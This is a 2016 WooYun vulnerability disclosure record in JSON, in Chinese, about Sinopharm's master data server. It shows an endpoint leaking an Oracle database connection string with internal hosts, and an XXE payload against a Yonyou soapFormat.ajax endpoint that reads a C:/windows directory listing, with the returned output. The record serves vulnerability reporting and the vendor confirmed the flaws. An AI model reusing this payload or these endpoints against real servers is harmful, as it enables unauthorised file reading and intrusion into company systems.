{"id": 87341, "wybug_id": "wooyun-2016-0197695", "wybug_title": "国药集团主数据服务器系统存在多个漏洞                                      ", "wybug_corp": "sinopharm.com", "wybug_author": "路人甲", "wybug_date": "2016-04-18 09:43", "wybug_open_date": "2016-06-02 10:50", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-02：\t细节向公众公开  简要描述： 国药集团主数据服务器系统存在多个漏洞 详细说明：  存在漏洞服务器http://mdm.sinopharm.com漏洞一，数据库配置信息泄露\nhttp://mdm.sinopharm.com//uapws/service/nc.itf.ses.inittool.PortalSESInitToolService\n\njdbc:oracle:thin:@(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST = 172.1.4.5)(PORT = 1521))(ADDRESS = (PROTOCOL = TCP)(HOST = 172.1.4.38)(PORT = 1521))(FAILOVER = ON)(CONNECT_DATA =(SERVER = DEDICATED)(SERVICE_NAME = gydb)(FAILOVER_MODE=(TYPE = SELECT)(METHOD = BASIC)(RETIRES = 20)(DELAY = 15))))\n漏洞二，任意文件目录读取http://mdm.sinopharm.com/uapws/soapFormat.ajax漏洞参考： WooYun: 用友软件企业门户xxe漏洞[测试前用友官域]   漏洞证明：  \nmsg=<!DOCTYPE foo [<!ENTITY xxe1two SYSTEM \\\"file:///c:/windows/\\\"> ]><soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode><faultstring>java.lang.RuntimeException: can not find datasource: ?</faultstring></soap:Fault></soap:Body></soap:Envelope>%0a, SOAP获取的数据如下：<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE foo [<!ENTITY xxe1two SYSTEM \\\"file:///c:/windows/\\\" >]><soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><soap:Fault><faultcode>soap:ServerAppCompatAppPatchassemblybfsvc.exeBootbootstat.datBrandingCursorsdebugdiagnosticsDigitalLockerDownloaded Program FilesDtcInstall.logen-USexplorer.exeFontsfveupdate.exeGlobalizationHelpHelpPane.exehh.exeIMEinfInstallerL2SchemasLiveKernelReportsLogsMediamib.binMicrosoft.NETModemLogsmsdfmap.iniOffline Web PagesPantherPFRO.logPLAPolicyDefinitionsregedit.exeRegistrationRemotePackagesrescacheResourcesSchCacheschemassecurityServerEnterprise.xmlServerWeb.xmlServiceProfilesservicingSetupsetupact.logsetuperr.logSoftwareDistributionSpeechsplwow64.exeSysMsiCachesystemsystem.iniSystem32SysWOW64TAPITasksTemptracingTSSysprep.logVssWebwin.iniWindowsShell.ManifestWindowsUpdate.logwinhlp32.exewinsxswrite.exezh-CN</faultcode><faultstring>java.lang.RuntimeException: can not find datasource: ?</faultstring></soap:Fault></soap:Body></soap:Envelope>\n   修复方案：  更新用友软件的安全问题   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-04-18 10:41 厂商回复： 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}